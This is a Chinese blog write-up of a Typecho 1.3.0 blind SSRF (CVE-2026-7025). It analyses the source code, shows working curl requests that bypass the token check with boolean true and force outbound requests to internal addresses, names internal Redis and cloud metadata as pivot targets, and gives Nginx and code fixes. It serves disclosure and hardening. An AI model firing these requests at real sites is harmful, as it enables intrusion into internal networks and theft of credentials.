#  急！急！急！Typecho 1.3漏洞复现与修复  
原创 大表哥吆
                        大表哥吆  kali笔记   2026-10-21 00:00  
  
   
  
> 我的博客一直在用Typecho，一直觉得这玩意儿轻、稳、没那么多破事。这不，漏洞又来了！  
  
  
本文在自有站点上完整复现了这条链，并用自建接收器拿到了两跳实证，最后给出两种修复方案和补丁验证结果。  
# 测试结果  
  
<table><thead><tr><th data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;background: rgba(0, 0, 0, 0.05);text-align: left;"><section><span leaf="">项目</span></section></th><th align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;background: rgba(0, 0, 0, 0.05);text-align: left;"><section><span leaf="">结果</span></section></th></tr></thead><tbody><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">漏洞编号</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">CVE-2026-7025</span></section></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">类型</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">未认证服务端请求伪造（Unauthenticated SSRF），盲打</span></section></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">影响版本</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">Typecho ≤ 1.3.0</span></section></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">CVSS 3.1</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">7.3（高危）</span></section></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">触发入口</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><code style="font-size: 90%;color: #c7254e;background: rgba(27, 31, 35, 0.05);padding: 3px 3px;border-radius: 4px;"><span leaf="">POST /index.php/action/service?do=ping</span></code></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">认证要求</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">无（</span><code style="font-size: 90%;color: #c7254e;background: rgba(27, 31, 35, 0.05);padding: 3px 3px;border-radius: 4px;"><span leaf="">token: true</span></code><span leaf=""> 即可绕过）</span></section></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">危害</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">任意出站 GET；解析响应头后向</span><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">任意地址</span></strong><span leaf="">发 XML-RPC POST（可打 127.0.0.1、内网段、云元数据）；附带泄露源站真实出口 IP</span></section></td></tr><tr><td data-colwidth="123" align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">修复</span></section></td><td align="left" style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: break-word;overflow-wrap: break-word;text-align: left;"><section><span leaf="">Nginx 封入口（1 分钟止血）/ 代码补丁（根治，4 处改动）</span></section></td></tr></tbody></table>  
  
一句话概括：这不是"缺防护"，是"有锁没上锁"。  
# 一 漏洞描述  
  
Typecho 的 Pingback  
 服务用来告诉别人"你文章里链接了我"。它的入口是 /action/service?do=ping  
，由框架无条件注册，后台没有任何开关能关掉它。  
  
问题出在两个缺陷的叠加：  
1. 1. **PHP 弱类型比较绕过**  
：进入这条路径的门票。  
sha1($secret . '&' . $time) == $token  
，当 $token  
 是布尔 true  
 时，string == true  
 恒成立，校验直接通过。  
  
1. 2. **出站请求没有协议与地址白名单**  
：SSRF 的实质。  
  
校验通过后，服务器会先 GET 一个你指定的 URL（第一跳），从响应里读出 X-Pingback  
 头或 <link rel="pingback">  
 标签（第二跳目标），再向它发 XML-RPC POST —— 这一步对目标地址不做任何检查。  
  
两者缺一不可：没有第一个，进不去；没有第二个，进去了也打不到内网。  
  
还有两个特性决定了它的危害方式和验证方法：  
- • **盲打**  
。sendPingHandle()  
 在出站之前就调用 throwFinish()  
 把响应 flush 给客户端了，出站结果永远不会回传。  
  
- • **所以基于响应时间差的检测完全无效**  
。你塞一个不可达地址、一个正常地址，响应耗时一模一样。必须上带外（OOB）通道。  
  
# 二 漏洞原理（源码级）  
### 2.1 入口：无条件注册  
```
// var/Widget/Service.php:298$this->on($this->request->isPost() && $this->request->is('do=ping'))->sendPingHandle();
```  
  
后台「评论设置 → 仅显示评论，不显示 Pingback 和 Trackback」这个选项没用，它只作用于前端评论列表的渲染，属于展示层；漏洞在发送端，全程不读任何配置。  
### 2.2 弱类型比较  
```
// var/Typecho/Common.php:821for ($i = $now; $i >= $from; $i--) {    if (sha1($secret . '&' . $i) == $token) {        return true;    }}
```  
  
$token  
 来自 JSON 请求体，可以是任意类型。"abc" == true  
 为真、0 == true  
 为假、true == true  
 为真 —— 所以只要传布尔 true  
，循环第一次比较就过。  
### 2.3 主体：两跳出站  
```
// var/Widget/Service.php:48if (!Common::timeTokenValidate($token, $this->options->secret, 3) || empty($permalink)) {    throw new Exception(_t('禁止访问'), 403);} $this->response->throwFinish();   // 先 flush，后面全是后台执行（盲打的根因） // 第一跳：只限制了 scheme 和 hostif ('http' != $urlPart['scheme'] && 'https' != $urlPart['scheme']) { continue; }if ($permalinkPart['host'] == $urlPart['host']) { continue; } $spider = Client::get();$spider->setTimeout(10)->send($url);                       // 任意 http/https 地址 if (!($xmlrpcUrl = $spider->getResponseHeader('x-pingback'))) {    preg_match('/<link[^>]*rel=["\']pingback["\'][^>]*href=["\']([^"\']+)["\'][^>]*>/i',               $spider->getResponseBody(), $out);    $xmlrpcUrl = $out[1] ?? '';} if (!empty($xmlrpcUrl)) {    $xmlrpc = new \IXR\Client($xmlrpcUrl);                 // 第二跳：零校验    $xmlrpc->pingback->ping($permalink, $url);}
```  
  
第一跳的限制只有两条：协议必须 http/https、host 不能和 permalink 相同。**没有任何内网地址校验**  
。第二跳更彻底，协议、IP 全不限。  
### 2.4 最讽刺的地方：框架自带"锁"  
```
// var/Typecho/Common.php:1006public static function checkSafeHost(string $host): bool{    // 拒绝 localhost、127.0.0.0/8、10/8、172.16/12、192.168/16、169.254/16、IPv6 回环/私网    return filter_var($address, FILTER_VALIDATE_IP,        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;}
```  
  
这个函数 Typecho 自己就有，专门用来挡内网地址 —— 但 sendPingHandle()  
 的第一跳和第二跳**从没调用过它**  
。所以修复特别干净：不用自己重写校验函数，复用现成的就行。  
### 2.5 一个收敛点：所有出站都走同一条路  
```
// var/IXR/Client.php:87$client = HttpClient::get();$client->setData($xml)->send($this->url);
```  
  
第二跳用的还是第一跳那个 Typecho\Http\Client  
。而 Http\Client::send()  
 只设置了 URL、超时、请求方法：  
```
// var/Typecho/Http/Client.php:273$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $this->method);// 没有 CURLOPT_PROTOCOLS、没有 REDIR_PROTOCOLS、没有 host 白名单
```  
  
cURL 支持什么协议，SSRF 就能用什么协议。但也正因为所有出站都过这一个出口，**一处补丁就能封死全部攻击面**  
。  
# 三 漏洞复现  
### 3.1 环境  
- • 目标：自有博客（Typecho 1.3.0，Nginx，直连无 CDN）  
  
- • 测试位置：本地 Kali  
  
- • 接收器：自建 Python 带外接收器（127.0.0.1:8899  
，跑在目标服务器的回环上）  
  
### 3.2 步骤一：确认版本与入口  
```
curl -sI https://nb.cn/ | head -5curl -s https://nb.cn/ | grep -o 'Typecho [0-9.]*'
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1N1JeeKBorfaCj6MkgLa8sklPjN6CQy9YMkAxvNhkgicTNiaPZGj710LNIe0UjvJBvLaQFtHb6I7hDaeONIhAmtB4z2cedWH7kCLkOs50gwic4/640?wx_fmt=png&from=appmsg "")  
### 3.3 步骤二：鉴权绕过（状态码对照）  
  
同一个请求，只改 token  
 的取值：  
```
for b in \ '{"token":true,"permalink":"https://example.com/","pingback":[]}' \ '{"token":"abc","permalink":"https://example.com/","pingback":[]}' \ '{"permalink":"https://example.com/","pingback":[]}' \ '{"token":0,"permalink":"https://example.com/","pingback":[]}' ; do  echo -n "$(curl -s -o /dev/null -w '%{http_code}' \    -H 'Content-Type: application/json' -X POST --data "$b" \    'https://blog.nb.cn/index.php/action/service?do=ping')  "  echo "$b"done
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1N1JeeKBorfhVMbmQNhRjFtGaV90pFmIEiasjAIubkbvFqvBZBN3pOI3jHunnbZwBspb0hUFMCBicWTqV9EFGpODCS2S5p8fqMg7CtfbejNSU/640?wx_fmt=png&from=appmsg "")  
### 3.4 步骤三：第一跳出站（自建接收器）  
  
在自己带的公网服务器创建脚本，执行命令：  
```
python3 ssrf-receiver.py --bind 127.0.0.1 --port 8899 --log /tmp/ssrf.log
```  
  
在kali中执行命令：  
```
curl -s -o /dev/null -w "HTTP:%{http_code} size:%{size_download}\n" \  -H "Content-Type: application/json" -X POST \  --data '{"token":true,"permalink":"https://example.com/",           "pingback":["http://127.0.0.1:8899/setpingback?to=http://127.0.0.1:8899/HOP2"]}' \  "https://nb.cn/index.php/action/service?do=ping"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1N1JeeKBoreZnnhw1af9ghCoP6K1Vvt1Ncib4HKsiadCr7wz7subb3dEicZQw2Wvw6htnSoLTdTonr5sGD8xmMcBXdvtFRVOmtkHTLgibKicMYxk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1N1JeeKBorcf2eaGhicyrJibdZ2icpDcR3Pe3qjiaMiaztsIHszw4QMK2hGBIqh38dSFmGvZAO9HibQ9XMnyBCKJ0CVKI1k6WDlVUakZRb4HU5GDE/640?wx_fmt=png&from=appmsg "")  
### 3.5 步骤四：第二跳 XML-RPC（完整链路）  
  
上面那个 /setpingback  
 接口会返回一个自定义响应头 X-Pingback  
，于是同一个请求立刻引出第二跳。接收器紧接着收到：  
```
[22:30:30] POST /HOP2  来源IP      : 127.0.0.1  User-Agent  : Typecho XML-RPC PHP Library     ← 决定性证据  Content-Type: text/xml  正文(284字节):<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://example.com/</string></value></param><param><value><string>http://127.0.0.1:8899/setpingback?to=...</string></value></param></params></methodCall>
```  
  
到这里链路闭环：  
  
未认证进入 → 服务器替我们 GET 任意地址 → 解析响应头拿到第二跳目标 → 再向该目标 POST。  
  
而且这次的目标是 127.0.0.1  
 —— 一个外部永远打不到的地址。**  
### 3.6 关于"能不能进而写马"  
  
这是被问得最多的问题，答案是：**这个洞本身做不到。**  
  
它没有文件写入原语，也不能回显，请求体还是固定的 pingback XML（只有 permalink  
 和 url  
 两个字段可控）。要落到"写文件/RCE"，必须先链上服务器内网里另一个可被滥用的服务，比如：  
- • 内网 Redis 未授权（写 crontab / 写 webshell，但常受运行用户权限限制）  
  
- • php-fpm 9000 的 FastCGI 攻击（需 gopher + 精确二进制包，本洞 payload 不可控，实操极难）  
  
- • 云元数据服务（拿 STS 临时凭据，接管云资源，而非写本地文件）  
  
# 四 漏洞处理  
### 4.1 紧急止血：Nginx 封入口（1 分钟）  
  
后台没有任何开关能关掉这条路径，唯一立刻生效的是网络层封禁：  
```
# 必须写在 server{} 内，且位于 location ~ \.php 之前location ~ ^/(index\.php/)?action/service {    deny all;    return 403;}
```  
### 4.2 根治：代码补丁（4 处改动）  
  
核心思路：在 Http\Client::send()  
 这个收敛点一次性封死所有出站，pingback 第一跳、第二跳、trackback 全都受控。  
  
**修复点 1：token 严格比较**  
（var/Typecho/Common.php  
）  
```
// 修复前if (sha1($secret . '&' . $i) == $token) { // 修复后if (!is_string($token) || '' === $token) {    return false;}// ...if (hash_equals(sha1($secret . '&' . $i), $token)) {
```  
  
先用 is_string()  
 挡掉 true  
、数组、数字等所有非字符串输入，再用 hash_equals()  
（严格且恒定时间，顺带防时序攻击）。asyncHandle()  
 用的是同一个函数，一并修好。  
  
**修复点 2：出站协议 + 地址白名单**  
（var/Typecho/Http/Client.php  
）  
```
$params = parse_url($url); $scheme = strtolower((string) ($params['scheme'] ?? ''));$host   = (string) ($params['host'] ?? ''); if (!in_array($scheme, ['http', 'https'], true)    || empty($host)    || !Common::checkSafeHost($host)) {    throw new Exception('Forbidden outbound url: ' . $url, 403);}
```  
  
**修复点 3：cURL 协议层封死**  
（同一文件）  
```
if (defined('CURLOPT_PROTOCOLS_STR')) {    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, 'http,https');    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS_STR, 'http,https');} else {    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);}curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
```  
  
**修复点 4：第二跳独立校验（纵深防御）**  
（var/Widget/Service.php  
）  
```
if (!empty($xmlrpcUrl)) {    $xp = parse_url($xmlrpcUrl);    if (empty($xp['host'])        || !in_array(strtolower($xp['scheme'] ?? ''), ['http', 'https'], true)        || !Common::checkSafeHost($xp['host'])) {        continue;    }    $xmlrpc = new \IXR\Client($xmlrpcUrl);    // ...}
```  
  
**免责声明**  
：本文所有测试均在站点所有者自有的授权环境中进行，用于安全研究与产品加固。请勿对未授权目标实施任何攻击行为。  
**参考**  
： https://blog.upx8.com/Typecho-1-3-0-CVE-2026-7025-SSRF  
  
   
  
更多精彩文章  欢迎关注我们  
  
  
